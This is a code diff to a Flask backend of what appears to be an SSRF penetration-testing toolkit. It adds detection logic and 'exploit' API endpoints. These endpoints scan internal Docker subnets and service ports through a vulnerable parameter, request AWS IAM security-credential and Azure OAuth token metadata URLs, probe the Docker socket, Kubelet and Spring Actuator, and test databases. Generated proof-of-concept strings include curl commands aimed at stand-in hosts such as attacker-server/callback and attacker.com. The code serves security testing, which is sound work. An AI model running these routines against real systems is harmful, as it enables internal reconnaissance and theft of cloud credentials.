+                                    'severity': 'CRITICAL',
+                                    'category': 'SSRF',
+                                    'cwe_id': 'CWE-918',
+                                    'cvss_score': '9.1',
+                                    'affected_url': endpoint_url,
+                                    'parameter': param,
+                                    'method': test_method,
+                                    'payload': f'http://callback-server/{param}',
+                                    'description': f'Server-Side Request Forgery (SSRF) vulnerability detected via callback. The endpoint makes external requests based on user-controlled parameter "{param}".',
+                                    'evidence': 'External callback was received, confirming the server made an outbound request to attacker-controlled URL.',
+                                    'proof_of_concept': f'''# Generic SSRF via Callback
+curl -X {test_method} '{endpoint_url}' \\
+  -H 'Content-Type: application/json' \\
+  -H 'Authorization: Bearer <your-token>' \\
+  -d '{{"{param}": "http://attacker-server/callback"}}'
+
+# Expected: Server makes outbound HTTP request to attacker's callback URL
+''',
+                                    'remediation': '''1. Validate and whitelist allowed URLs/domains
+2. Block requests to private IP ranges (RFC 1918) and localhost
+3. Block cloud metadata endpoints (169.254.169.254, metadata.google.internal)
+4. Implement proper input validation with allow-lists
+5. Consider using a URL parsing library to prevent bypass techniques''',
+                                    'references': [
+                                        'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
+                                        'https://portswigger.net/web-security/ssrf',
+                                        'https://cwe.mitre.org/data/definitions/918.html'
+                                    ],
+                                    'timestamp': datetime.now().isoformat()
+                                }
+                                
+                                # Log and emit finding
+                                web_logger.logger.info(f"[CRITICAL] {finding_details['description']}")
+                                web_logger._emit_log('finding', finding_details['description'], 'CRITICAL')
+                                add_finding(finding_details)
+                                web_logger.info(f"   ✅ Created generic SSRF finding for {param}")
+                
                 except Exception as e:
                     web_logger.error(f"   Error testing cloud metadata: {str(e)}")
         
         update_progress('Callback Testing Complete', 65)
     
-    # Phase 4: Internal Scanning (Only if SSRF confirmed via callback)
+    # Phase 4: Internal Scanning - DISABLED in discovery phase
+    # ✅ NEW WORKFLOW: Internal scanning is now triggered from finding details page
     if config.blackbox.internal_scan and len(fuzz_results) > 0:
         # Check if we have ANY confirmed SSRF from callback testing
         confirmed_ssrf = False
@@ -2107,78 +2713,26 @@ curl -X {test_method} '{endpoint_url}' \\
                 break
         
         if not confirmed_ssrf:
-            web_logger.warning("⚠️ Skipping internal scan - No confirmed SSRF vulnerability")
-            web_logger.info("💡 Internal scanning requires a confirmed SSRF to avoid scanning pentester's own machine")
+            web_logger.info("ℹ️ No confirmed SSRF - Internal scanning not applicable")
             update_progress('Internal Scan Skipped', 70)
         else:
-            update_progress('Internal Network Scanning', 70)
-            web_logger.info("🔎 Phase 4: Internal Network Scanning")
-            web_logger.info(f"🎯 Using confirmed SSRF parameter: {ssrf_param} at {ssrf_url}")
-            web_logger.info(f"⚠️ Note: Scanning localhost of TARGET service, not pentester machine")
-            
-            try:
-                scanner = InternalScanner(
-                    ssrf_url=ssrf_url,
-                    ssrf_param=ssrf_param,
-                    timeout=5
-                )
-                
-                services = scanner.discover_services()
-                web_logger.info(f"🎯 Discovered {len(services)} internal services")
-                
-                for service in services:
-                    # Create detailed finding for each internal service
-                    service_finding = {
-                        'title': f'🌐 Internal Service Accessible via SSRF',
-                        'severity': 'HIGH',
-                        'category': 'SSRF - Internal Service Discovery',
-                        'cwe_id': 'CWE-918',
-                        'cvss_score': '7.5',
-                        'affected_url': ssrf_url,
-                        'parameter': ssrf_param,
-                        'method': 'POST',
-                        'internal_host': service['host'],
-                        'internal_port': service['port'],
-                        'service_name': service['service'],
-                        'description': f"Internal service {service['service']} on {service['host']}:{service['port']} is accessible via SSRF vulnerability. Attacker can interact with internal infrastructure that should not be exposed.",
-                        'evidence': f"Service: {service['service']}\nHost: {service['host']}\nPort: {service['port']}\nAccessible: Yes",
-                        'proof_of_concept': f'''# Access internal service via SSRF
-curl -X POST '{ssrf_url}' \\
-  -H 'Content-Type: application/json' \\
-  -H 'Authorization: Bearer <your-token>' \\
-  -d '{{"{ssrf_param}": "http://{service['host']}:{service['port']}"}}'
-
-# This allows you to:
-# 1. Port scan internal network
-# 2. Access internal services (databases, admin panels, etc.)
-# 3. Bypass network security controls
-''',
-                        'remediation': '''1. Implement strict URL validation and whitelisting
-2. Block access to private IP ranges (RFC 1918, RFC 4193)
-3. Use network segmentation to isolate sensitive services
-4. Implement egress filtering
-5. Consider using a proxy for external requests''',
-                        'references': [
-                            'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
-                            'https://portswigger.net/web-security/ssrf',
-                            'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html'
-                        ],
-                        'timestamp': datetime.now().isoformat()
-                    }
-                    
-                    # Log and save finding
-                    web_logger.logger.info(f"[HIGH] Internal service accessible: {service['host']}:{service['port']} - {service['service']}")
-                    web_logger._emit_log('finding', f"Internal service accessible: {service['host']}:{service['port']} - {service['service']}", 'HIGH')
-                    add_finding(service_finding)
-                    
-            except Exception as e:
-                web_logger.warning(f"Internal scanning failed: {str(e)}")
-        
-        update_progress('Internal Scanning Complete', 85)
+            # ✅ NEW: Don't run internal scan automatically, just notify user
+            web_logger.info("✅ SSRF vulnerability confirmed!")
+            web_logger.info("💡 Để khai thác SSRF (Internal Network Scan):")
+            web_logger.info("   1️⃣ Xem chi tiết finding trong Results")
+            web_logger.info("   2️⃣ Chọn 'Exploit this SSRF' để quét internal network")
+            web_logger.info("   3️⃣ Tool sẽ scan internal services qua SSRF vulnerability")
+            update_progress('Internal Scan Available', 70)
+    else:
+        # Internal scan disabled in config
+        web_logger.info("ℹ️ Internal Network Scan: Disabled (run from finding details after discovery)")
+        update_progress('Detection Phase Complete', 70)
 
 def run_graybox(config: ToolkitConfig, db: FindingDatabase):
     """Run gray box testing"""
     web_logger.info("🔍 Starting Gray Box Testing")
+    
+    docker_containers = []
     
     if config.graybox.docker_inspect:
         update_progress('Docker Inspection', 90)
@@ -2186,16 +2740,199 @@ def run_graybox(config: ToolkitConfig, db: FindingDatabase):
         
         try:
             inspector = DockerInspector()
-            containers = inspector.list_containers()
+            docker_containers = inspector.get_containers()
             
-            web_logger.info(f"Found {len(containers)} Docker containers")
+            web_logger.info(f"Found {len(docker_containers)} Docker containers")
             
-            for container in containers:
-                networks = inspector.get_container_networks(container['id'])
-                for net in networks:
-                    web_logger.info(f"Container {container['name']}: {net['ip']} in {net['network']}")
+            # Log network topology
+            for container in docker_containers:
+                for network_name, network_info in container.get('networks', {}).items():
+                    ip = network_info.get('ip_address')
+                    web_logger.info(f"Container {container['name']}: {ip} in {network_name}")
+            
+            # Initialize SSRF detector with Docker topology
+            web_logger.info("🎯 Initializing SSRF Detector with Docker topology")
+            
+            # ✅ Get custom parameters from scan_state
+            custom_parameters = scan_state.get('custom_parameters', [])
+            if custom_parameters:
+                web_logger.info(f"📝 Using custom SSRF parameters: {', '.join(custom_parameters)}")
+            
+            ssrf_detector = SSRFDetector(
+                docker_services=docker_containers,
+                custom_parameters=custom_parameters if custom_parameters else None
+            )
+            
+            # Track detected endpoints to avoid duplicates
+            detected_set = set()
+            
+            # Analyze traffic data for SSRF endpoints (from uploaded Burp/HAR file OR target URL)
+            traffic_data = scan_state.get('traffic_data')
+            target_url = config.graybox.target_url
+            
+            # Case 1: Has traffic data from uploaded file
+            if traffic_data and traffic_data.get('requests'):
+                web_logger.info(f"📡 Analyzing {len(traffic_data['requests'])} requests from {traffic_data.get('source', 'traffic file')} for SSRF")
+                try:
+                    requests_data = traffic_data['requests']
+                    
+                    # Detect SSRF endpoints
+                    for req_data in requests_data:
+                        findings = ssrf_detector.detect_from_http_request(
+                            url=req_data.get('url', ''),
+                            method=req_data.get('method', 'GET'),
+                            query_params=req_data.get('params', {}),
+                            body_params=req_data.get('body', {}),
+                            headers=req_data.get('headers', {})
+                        )
+                        
+                        # Save findings to database
+                        for finding in findings:
+                            # Deduplicate: skip if same URL+parameter already detected
+                            finding_key = f"{finding.url}|{finding.parameter}"
+                            if finding_key in detected_set:
+                                continue
+                            detected_set.add(finding_key)
+                            
+                            # Map confidence to CVSS score
+                            cvss_map = {'high': '8.6', 'medium': '6.5', 'low': '4.3'}
+                            add_finding({
+                                'title': f'🎯 Potential SSRF Endpoint Detected',
+                                'severity': finding.confidence.upper(),
+                                'category': 'SSRF',
+                                'cwe_id': 'CWE-918',
+                                'cvss_score': cvss_map.get(finding.confidence, '6.5'),
+                                'affected_url': finding.url,
+                                'parameter': finding.parameter,
+                                'method': finding.method,
+                                'description': finding.reason,
+                                'evidence': f'Parameter Type: {finding.parameter_type}\nDetection Method: {finding.detection_method}\nPotential Targets: {', '.join(finding.potential_targets) if finding.potential_targets else 'N/A'}',
+                                'proof_of_concept': f'Test this endpoint with:\ncurl -X {finding.method} "{finding.url}" -d "{finding.parameter}=http://attacker.com"',
+                                'remediation': 'Validate and whitelist allowed URLs/domains. Block requests to private IP ranges and cloud metadata endpoints.',
+                                'references': ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'],
+                                'timestamp': datetime.now().isoformat()
+                            })
+                            
+                            # Log to console (don't use web_logger.finding() as it creates duplicate)
+                            severity_emoji = {'high': '🔴', 'medium': '🟡', 'low': '🟢'}
+                            web_logger.info(
+                                f"[{finding.confidence}] {severity_emoji.get(finding.confidence, '⚪')} SSRF Detected: {finding.url}\n"
+                                f"   Parameter: {finding.parameter} ({finding.parameter_type})\n"
+                                f"   Reason: {finding.reason}\n"
+                                f"   Detection: {finding.detection_method}"
+                            )
+                    
+                    web_logger.info(f"✅ SSRF Detection Complete: {len(ssrf_detector.detected_endpoints)} findings")
+                    
+                except Exception as e:
+                    import traceback
+                    web_logger.warning(f"SSRF detection failed: {str(e)}")
+                    web_logger.warning(f"Traceback: {traceback.format_exc()}")
+            
+            # Case 2: No traffic file but has target URL - analyze the URL pattern
+            elif target_url and target_url != "http://localhost:8083":
+                web_logger.info(f"🎯 No traffic file provided - analyzing target URL: {target_url}")
+                try:
+                    from urllib.parse import urlparse, parse_qs
+                    parsed = urlparse(target_url)
+                    
+                    # Extract query parameters
+                    query_params = parse_qs(parsed.query)
+                    # Flatten lists (parse_qs returns lists)
+                    query_params = {k: v[0] if v else '' for k, v in query_params.items()}
+                    
+                    web_logger.info(f"📊 URL Analysis:")
+                    web_logger.info(f"   Path: {parsed.path}")
+                    web_logger.info(f"   Query params: {list(query_params.keys())}")
+                    
+                    # 🎯 NEW: If custom parameters are specified but not in URL, create hypothetical findings
+                    if custom_parameters and not query_params:
+                        web_logger.info(f"💡 Creating hypothetical findings for custom parameters: {', '.join(custom_parameters)}")
+                        # Create fake query params with custom parameter names
+                        for custom_param in custom_parameters:
+                            query_params[custom_param] = "http://example.com"  # Placeholder value
+                    
+                    # Create fake request for SSRF detection
+                    findings = ssrf_detector.detect_from_http_request(
+                        url=target_url,
+                        method='GET',
+                        query_params=query_params,
+                        body_params={},
+                        headers={}
+                    )
+                    
+                    # Save findings to database
+                    for finding in findings:
+                        # Deduplicate: skip if same URL+parameter already detected
+                        finding_key = f"{finding.url}|{finding.parameter}"
+                        if finding_key in detected_set:
+                            continue
+                        detected_set.add(finding_key)
+                        
+                        # Check if this is a hypothetical finding (no query params in original URL)
+                        is_hypothetical = custom_parameters and not parsed.query and finding.parameter in custom_parameters
+                        
+                        description = finding.reason
+                        title_prefix = "⚠️ Potential" if is_hypothetical else "🎯"
+                        if is_hypothetical:
+                            description = f"⚠️ POTENTIAL SSRF: Endpoint accepts '{finding.parameter}' parameter (based on your custom parameter list)\n{finding.reason}"
+                        
+                        evidence_text = f'Parameter Type: {finding.parameter_type}\nDetection Method: {finding.detection_method}\nPotential Targets: {', '.join(finding.potential_targets) if finding.potential_targets else 'N/A'}'
+                        if is_hypothetical:
+                            evidence_text += f'\n\nℹ️ This is a hypothetical finding based on URL pattern and custom parameters.\nTest with: {target_url.split("?")[0]}?{finding.parameter}=http://attacker.com'
+                        
+                        # Map confidence to CVSS score
+                        cvss_map = {'high': '8.6', 'medium': '6.5', 'low': '4.3'}
+                        
+                        add_finding({
+                            'title': f'{title_prefix} SSRF Endpoint Detected',
+                            'severity': finding.confidence.upper(),
+                            'category': 'SSRF',
+                            'cwe_id': 'CWE-918',
+                            'cvss_score': cvss_map.get(finding.confidence, '6.5'),
+                            'affected_url': finding.url,
+                            'parameter': finding.parameter,
+                            'method': finding.method,
+                            'description': description,
+                            'evidence': evidence_text,
+                            'proof_of_concept': f'Test this endpoint with:\ncurl -X {finding.method} "{target_url.split("?")[0]}?{finding.parameter}=http://attacker.com"',
+                            'remediation': 'Validate and whitelist allowed URLs/domains. Block requests to private IP ranges and cloud metadata endpoints.',
+                            'references': ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'],
+                            'timestamp': datetime.now().isoformat()
+                        })
+                        
+                        # Log to UI
+                        severity_emoji = {'high': '🔴', 'medium': '🟡', 'low': '🟢'}
+                        prefix = "Potential SSRF" if is_hypothetical else "SSRF Detected"
+                        web_logger.finding(
+                            finding.confidence,
+                            f"{severity_emoji.get(finding.confidence, '⚪')} {prefix}: {finding.url}\n"
+                            f"   Parameter: {finding.parameter} ({finding.parameter_type})\n"
+                            f"   Reason: {finding.reason}\n"
+                            f"   Detection: {finding.detection_method}"
+                        )
+                    
+                    if findings:
+                        web_logger.info(f"✅ SSRF Detection Complete: {len(findings)} potential SSRF endpoint(s) found")
+                        if custom_parameters and not parsed.query:
+                            web_logger.info(f"📌 These are hypothetical findings based on:")
+                            web_logger.info(f"   - URL path pattern: {parsed.path}")
+                            web_logger.info(f"   - Custom parameters you specified: {', '.join(custom_parameters)}")
+                            web_logger.info(f"💡 Test with: {target_url}?{custom_parameters[0]}=http://attacker.com")
+                    else:
+                        web_logger.info(f"ℹ️ No SSRF patterns detected in target URL")
+                    
+                except Exception as e:
+                    import traceback
+                    web_logger.warning(f"Target URL analysis failed: {str(e)}")
+                    web_logger.warning(f"Traceback: {traceback.format_exc()}")
+            else:
+                web_logger.info("ℹ️ No traffic data or target URL available for SSRF analysis")
+            
         except Exception as e:
+            import traceback
             web_logger.warning(f"Docker inspection failed: {str(e)}")
+            web_logger.warning(f"Traceback: {traceback.format_exc()}")
 
 def run_whitebox(config: ToolkitConfig, db: FindingDatabase):
     """Run white box testing"""
@@ -2272,6 +3009,512 @@ def update_progress(phase: str, progress: int):
         'progress': progress,
         'percent': progress  # Add 'percent' for frontend compatibility
     })
+
+# ============================================================
+# SSRF DETECTION API ENDPOINTS
+# ============================================================
+
+@app.route('/api/ssrf/detect', methods=['POST'])
+def detect_ssrf_from_request():
+    """Detect SSRF from raw HTTP request or structured data"""
+    try:
+        data = request.get_json()
+        
+        # Get Docker containers for topology
+        docker_containers = []
+        try:
+            inspector = DockerInspector()
+            if inspector.is_available:
+                docker_containers = inspector.get_containers()
+        except:
+            pass
+        
+        # Initialize SSRF detector
+        detector = SSRFDetector(docker_services=docker_containers)
+        
+        # Check if raw request or structured data
+        if 'raw_request' in data:
+            # Parse raw HTTP request
+            findings = detector.detect_from_burp_request(data['raw_request'])
+        else:
+            # Structured data
+            findings = detector.detect_from_http_request(
+                url=data.get('url', ''),
+                method=data.get('method', 'GET'),
+                query_params=data.get('query_params'),
+                body_params=data.get('body_params'),
+                headers=data.get('headers')
+            )
+        
+        # Format findings
+        results = []
+        for finding in findings:
+            results.append({
+                'url': finding.url,
+                'method': finding.method,
+                'parameter': finding.parameter,
+                'parameter_type': finding.parameter_type,
+                'confidence': finding.confidence,
+                'reason': finding.reason,
+                'potential_targets': finding.potential_targets,
+                'detection_method': finding.detection_method
+            })
+        
+        return jsonify({
+            'success': True,
+            'total_findings': len(results),
+            'findings': results,
+            'report': detector.generate_report()
+        })
+        
+    except Exception as e:
+        return jsonify({
+            'success': False,
+            'error': str(e)
+        }), 500
+
+# ============================================================
+# EXPLOITATION API ENDPOINTS
+# ============================================================
+
+@app.route('/api/exploit/internal_scan', methods=['POST'])
+def exploit_internal_scan():
+    """Exploit SSRF to scan internal network"""
+    try:
+        data = request.get_json()
+        target_url = data.get('target_url')
+        parameter = data.get('parameter')
+        method = data.get('method', 'GET')
+        
+        if not target_url or not parameter:
+            return jsonify({'error': 'Missing required parameters'}), 400
+        
+        from blackbox.exploitation.internal_scan import InternalScanner
+        
+        # Initialize scanner with shorter timeout
+        scanner = InternalScanner(
+            ssrf_url=target_url,
+            ssrf_param=parameter,
+            timeout=2  # Reduced from 5s to 2s
+        )
+        
+        # STEP 1: Network ranges to scan (Docker + Private networks)
+        network_ranges = [
+            ('127.0.0.1', 'Localhost'),
+            ('172.17.0.0/24', 'Docker Bridge Default'),  # 172.17.0.1-254
+            ('172.18.0.0/24', 'Docker Custom Network'),  # 172.18.0.1-254
+        ]
+        
+        # STEP 2: Microservices ports (based on user's docker-compose)
+        service_ports = {
+            # Web Services
+            80: 'HTTP/Nginx',
+            443: 'HTTPS',
+            3000: 'Frontend (React)',
+            5000: 'Flask',
+            8000: 'Django',
+            8080: 'API Gateway',
+            8081: 'User Service',
+            8082: 'Product Service', 
+            8083: 'Inventory Service',
+            8084: 'Order Service',
+            # Databases
+            5432: 'PostgreSQL (internal)',
+            5433: 'PostgreSQL User',
+            5434: 'PostgreSQL Product',
+            5435: 'PostgreSQL Order',
+            5436: 'PostgreSQL Inventory',
+            3306: 'MySQL',
+            27017: 'MongoDB',
+            6379: 'Redis',
+            9200: 'Elasticsearch',
+            5672: 'RabbitMQ'
+        }
+        
+        results = []
+        alive_hosts = []
+        scan_ips = []  # Initialize early to avoid NameError
+        services_by_name = []
+        services_by_ip = []
+        
+        # STEP 3A: Docker service names (for containers in same network)
+        # If target is INSIDE Docker network, it can resolve these names
+        docker_services = {
+            'user-service': [8081],
+            'product-service': [8082],
+            'inventory-service': [8083],
+            'order-service': [8084],
+            'api-gateway': [8080],
+            'frontend': [80],
+            'redis': [6379],
+            'postgres-user': [5432],
+            'postgres-product': [5432],
+            'postgres-order': [5432],
+            'postgres-inventory': [5432],
+        }
+        
+        # STEP 3B: Try scanning Docker services by NAME first (FAST - only 11 services)
+        web_logger.info(f"🔍 Step 1/3: Scanning {len(docker_services)} Docker services by name...")
+        scan_count = 0
+        for service_name, ports in docker_services.items():
+            for port in ports:
+                scan_count += 1
+                result = scanner.scan_port(service_name, port)
+                web_logger.info(f"  [{scan_count}] {service_name}:{port} → status={result.get('status')}, open={result.get('open')}")
+                if result.get('open'):
+                    results.append({
+                        'container_ip': service_name,
+                        'port': port,
+                        'service': f'{service_name.upper()} (Docker DNS)',
+                        'status': 'open',
+                        'response_time': result.get('response_time', 0),
+                        'container_name': service_name
+                    })
+                    if service_name not in alive_hosts:
+                        alive_hosts.append(service_name)
+        
+        web_logger.info(f"✅ Step 1 done: Scanned {scan_count} endpoints, found {len(results)} services by Docker DNS")
+        
+        # STEP 3C: Quick host discovery by IP (only if Docker DNS scan found nothing)
+        # Skip IP scanning if we already found services by name to save time
+        if len(results) == 0:
+            web_logger.info("⚠️ No services found by Docker DNS, trying IP scanning...")
+            discovery_ports = [80, 8080, 8081, 8082, 8083, 8084]
+            
+            # Generate IPs to scan (reduced range for speed)
+            scan_ips = ['127.0.0.1']
+            # Docker networks: scan .1 (gateway) and .2-.10 (reduced from .20)
+            for subnet in ['172.17.0', '172.18.0']:
+                scan_ips.extend([f'{subnet}.{i}' for i in range(1, 11)])
+            
+            web_logger.info(f"🔍 Step 2/3: Scanning {len(scan_ips)} IPs for alive hosts...")
+            # Quick discovery: find alive hosts
+            for ip in scan_ips:
+                for port in discovery_ports:
+                    result = scanner.scan_port(ip, port)
+                    if result.get('open'):
+                        if ip not in alive_hosts:
+                            alive_hosts.append(ip)
+                        break  # Host alive, move to next IP
+            
+            # STEP 4: Full port scan on alive hosts (IP-based)
+            web_logger.info(f"🔍 Step 3/3: Full port scan on {len(alive_hosts)} alive hosts...")
+            for host in alive_hosts:
+                # Skip if already scanned by name
+                if host in docker_services:
+                    continue
+                    
+                for port, service_name in service_ports.items():
+                    result = scanner.scan_port(host, port)
+                    if result.get('open'):
+                        results.append({
+                            'container_ip': host,
+                            'port': port,
+                            'service': service_name,
+                            'status': 'open',
+                            'response_time': result.get('timing', 0),
+                            'container_name': f'container-{host.split(".")[-1]}'  # Estimate name from IP
+                        })
+        else:
+            web_logger.info(f"✅ Found {len(results)} services by Docker DNS, skipping IP scan for speed")
+        
+        # Summary
+        hosts_found = list(set(r['container_ip'] for r in results))
+        services_by_name = [r for r in results if r['container_ip'] in docker_services.keys()]
+        services_by_ip = [r for r in results if r['container_ip'] not in docker_services.keys()]
+        
+        if len(results) > 0:
+            message = (
+                f'✅ Microservices Discovery Complete!\n'
+                f'• Found {len(services_by_name)} services by Docker DNS name\n'
+                f'• Found {len(services_by_ip)} services by IP scanning\n'
+                f'• Total: {len(results)} accessible services\n'
+                f'• Hosts: {", ".join(hosts_found[:10])}{"..." if len(hosts_found) > 10 else ""}'
+            )
+        else:
+            message = (
+                f'❌ No services discovered\n'
+                f'• Tried {len(docker_services)} Docker service names (e.g., user-service, product-service)\n'
+                f'• Scanned {len(scan_ips)} IPs (localhost + Docker 172.17.0.x, 172.18.0.x)\n'
+                f'• Tested {len(service_ports)} ports per alive host\n'
+                f'• Possible reasons:\n'
+                f'  - Target server is NOT inside Docker network (cannot resolve service names)\n'
+                f'  - Services on different subnet or firewall rules blocking\n'
+                f'  - SSRF timeout too short (2s)'
+            )
+        
+        return jsonify({
+            'success': len(results) > 0,
+            'message': message,
+            'results': results,
+            'discovery_summary': {
+                'docker_services_tested': list(docker_services.keys()),
+                'services_found_by_name': len(services_by_name),
+                'services_found_by_ip': len(services_by_ip),
+                'total_ips_scanned': len(scan_ips),
+                'alive_hosts': alive_hosts,
+                'services_found': len(results),
+                'networks_tested': ['Docker DNS names', '127.0.0.1', '172.17.0.0/24', '172.18.0.0/24'],
+                'ports_tested': list(service_ports.keys()),
+                'timeout': 2
+            }
+        })
+        
+    except Exception as e:
+        web_logger.error(f"Internal scan error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/exploit/cloud_deep_dive', methods=['POST'])
+def exploit_cloud_deep_dive():
+    """Extended cloud metadata exploitation"""
+    try:
+        data = request.get_json()
+        target_url = data.get('target_url')
+        parameter = data.get('parameter')
+        
+        if not target_url or not parameter:
+            return jsonify({'error': 'Missing required parameters'}), 400
+        
+        # Extended cloud metadata endpoints
+        cloud_endpoints = {
+            'AWS': [
+                'http://169.254.169.254/latest/meta-data/',
+                'http://169.254.169.254/latest/user-data/',
+                'http://169.254.169.254/latest/dynamic/instance-identity/document',
+                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+            ],
+            'GCP': [
+                'http://metadata.google.internal/computeMetadata/v1/',
+                'http://metadata.google.internal/computeMetadata/v1/instance/',
+                'http://metadata.google.internal/computeMetadata/v1/project/',
+            ],
+            'Azure': [
+                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+                'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
+            ]
+        }
+        
+        results = []
+        for cloud, endpoints in cloud_endpoints.items():
+            for endpoint in endpoints:
+                # Test endpoint via SSRF with shorter timeout
+                test_payload = f"{target_url}?{parameter}={endpoint}"
+                try:
+                    response = requests.get(test_payload, timeout=2)
+                    content = response.text.lower()
+                    
+                    # Only count as accessible if:
+                    # 1. Status 200 AND
+                    # 2. NOT 404 error page AND  
+                    # 3. Contains actual metadata indicators
+                    if (response.status_code == 200 and 
+                        '404' not in content and 
+                        'not found' not in content and
+                        len(response.text) > 50 and
+                        any(indicator in content for indicator in ['ami-', 'instance-', 'region', 'account', 'credentials', 'token', 'metadata'])):
+                        
+                        results.append({
+                            'cloud': cloud,
+                            'endpoint': endpoint,
+                            'status': 'accessible',
+                            'preview': response.text[:200]
+                        })
+                except Exception:
+                    pass
+        
+        return jsonify({
+            'success': True,
+            'message': f'Tested cloud metadata endpoints, found {len(results)} accessible',
+            'results': results
+        })
+        
+    except Exception as e:
+        web_logger.error(f"Cloud deep dive error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/exploit/container_discovery', methods=['POST'])
+def exploit_container_discovery():
+    """Discover container/Docker metadata and environment info via SSRF"""
+    try:
+        data = request.get_json()
+        target_url = data.get('target_url')
+        parameter = data.get('parameter')
+        
+        if not target_url or not parameter:
+            return jsonify({'error': 'Missing required parameters'}), 400
+        
+        # Container environment detection endpoints
+        container_endpoints = {
+            # Docker environment files (commonly accessible from inside containers)
+            'http://localhost/.dockerenv': 'Docker environment marker',
+            'http://127.0.0.1/.dockerenv': 'Docker environment marker',
+            
+            # Docker socket (if mounted - rare but possible)
+            'http://unix:/var/run/docker.sock/containers/json': 'Docker socket',
+            
+            # Container hostname file
+            'http://localhost/etc/hostname': 'Container hostname',
+            'http://127.0.0.1/etc/hostname': 'Container hostname',
+            
+            # Docker API (unlikely but worth trying)
+            'http://127.0.0.1:2375/containers/json': 'Docker API',
+            'http://172.17.0.1:2375/containers/json': 'Docker API (gateway)',
+            
+            # Kubernetes service discovery
+            'http://kubernetes.default.svc.cluster.local': 'Kubernetes internal DNS',
+            'http://localhost:10250/pods': 'Kubernetes Kubelet',
+            
+            # Service discovery systems
+            'http://localhost:8500/v1/catalog/services': 'Consul',
+            'http://consul:8500/v1/catalog/services': 'Consul (Docker)',
+            'http://localhost:8761/eureka/apps': 'Eureka',
+            'http://eureka:8761/eureka/apps': 'Eureka (Docker)',
+            
+            # Common management endpoints in containers
+            'http://localhost:9090/metrics': 'Prometheus metrics',
+            'http://localhost:8080/actuator': 'Spring Boot Actuator',
+            'http://localhost:8080/actuator/env': 'Spring Boot Environment',
+            'http://localhost:8080/health': 'Health endpoint',
+        }
+        
+        results = []
+        for endpoint, description in container_endpoints.items():
+            test_payload = f"{target_url}?{parameter}={endpoint}"
+            try:
+                response = requests.get(test_payload, timeout=2)
+                content = response.text.lower()
+                
+                # Detect if endpoint is accessible and contains container-related info
+                is_accessible = False
+                evidence = ""
+                
+                if response.status_code == 200 and '404' not in content and 'not found' not in content:
+                    # Check for container indicators
+                    if any(indicator in content for indicator in [
+                        'docker', 'container', 'kubernetes', 'k8s', 'pod',
+                        'service', 'consul', 'eureka', 'actuator', 'metrics',
+                        'hostname', 'dockerenv'
+                    ]):
+                        is_accessible = True
+                        evidence = response.text[:150]
+                    elif len(response.text) > 20 and len(response.text) < 100:
+                        # Small responses (like hostname) are likely valid
+                        is_accessible = True
+                        evidence = response.text[:150]
+                
+                if is_accessible:
+                    results.append({
+                        'endpoint': endpoint,
+                        'type': description,
+                        'status': 'accessible',
+                        'evidence': evidence
+                    })
+            except Exception:
+                pass
+        
+        # Prepare response message
+        if len(results) > 0:
+            message = f'✅ Found {len(results)} container/orchestration indicators!'
+        else:
+            message = (
+                f'❌ No container metadata found. Possible reasons:\n'
+                f'• Target server NOT running inside container\n'
+                f'• Container metadata endpoints not exposed\n'
+                f'• Docker/K8s management APIs secured\n'
+                f'• Service discovery systems not installed\n'
+                f'💡 Note: Internal Scan already checks Docker service names (user-service, redis, etc.)'
+            )
+        
+        return jsonify({
+            'success': len(results) > 0,
+            'message': message,
+            'results': results,
+            'tested_endpoints': len(container_endpoints),
+            'note': 'Container discovery requires Docker/K8s APIs to be exposed and accessible via HTTP'
+        })
+        
+    except Exception as e:
+        web_logger.error(f"Container discovery error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/exploit/database_test', methods=['POST'])
+def exploit_database_test():
+    """Test database connections via SSRF"""
+    try:
+        data = request.get_json()
+        target_url = data.get('target_url')
+        parameter = data.get('parameter')
+        
+        if not target_url or not parameter:
+            return jsonify({'error': 'Missing required parameters'}), 400
+        
+        # Database connection strings
+        db_tests = [
+            ('redis://127.0.0.1:6379', 'Redis'),
+            ('redis://172.17.0.1:6379', 'Redis (Docker)'),
+            ('http://127.0.0.1:5984', 'CouchDB'),
+            ('http://127.0.0.1:9200', 'Elasticsearch'),
+            ('http://127.0.0.1:27017', 'MongoDB'),
+            ('postgresql://127.0.0.1:5432', 'PostgreSQL'),
+            ('mysql://127.0.0.1:3306', 'MySQL'),
+        ]
+        
+        results = []
+        for db_url, db_type in db_tests:
+            test_payload = f"{target_url}?{parameter}={db_url}"
+            try:
+                response = requests.get(test_payload, timeout=2)
+                content = response.text.lower()
+                
+                # Database service detection via error messages
+                # In microservices: Error = Service EXISTS (protocol mismatch or auth required)
+                detected = False
+                detection_type = None
+                
+                if 'no connection adapters' in content or 'redis://' in content or 'postgresql://' in content or 'mysql://' in content:
+                    detected = True
+                    detection_type = 'Protocol mismatch (service exists but not HTTP)'
+                elif 'max retries' in content or 'connection' in content:
+                    detected = True
+                    detection_type = 'Connection attempt (service may exist, port responding)'
+                elif any(indicator in content for indicator in ['version', 'cluster_name', 'lucene', 'redis', 'database']):
+                    detected = True
+                    detection_type = 'Direct response (service accessible via HTTP)'
+                
+                if detected:
+                    results.append({
+                        'database': db_type,
+                        'url': db_url,
+                        'status': detection_type,
+                        'evidence': response.text[:150]
+                    })
+            except Exception:
+                pass
+        
+        # Prepare response message
+        if len(results) > 0:
+            message = f'✅ Detected {len(results)} database services! (Error messages = service exists in microservices architecture)'
+        else:
+            message = (
+                f'❌ No database services detected. Possible reasons:\n'
+                f'• No databases running on tested hosts (127.0.0.1, 172.17.0.1)\n'
+                f'• Firewall blocking all database ports\n'
+                f'• Target application not returning error details'
+            )
+        
+        return jsonify({
+            'success': len(results) > 0,
+            'message': message,
+            'results': results,
+            'tested_databases': len(db_tests),
+            'note': '💡 In microservices: Connection errors = Service EXISTS (protocol mismatch is normal via HTTP SSRF)'
+        })
+        
+    except Exception as e:
+        web_logger.error(f"Database test error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+# ============================================================
 
 @socketio.on('connect')
 def handle_connect():
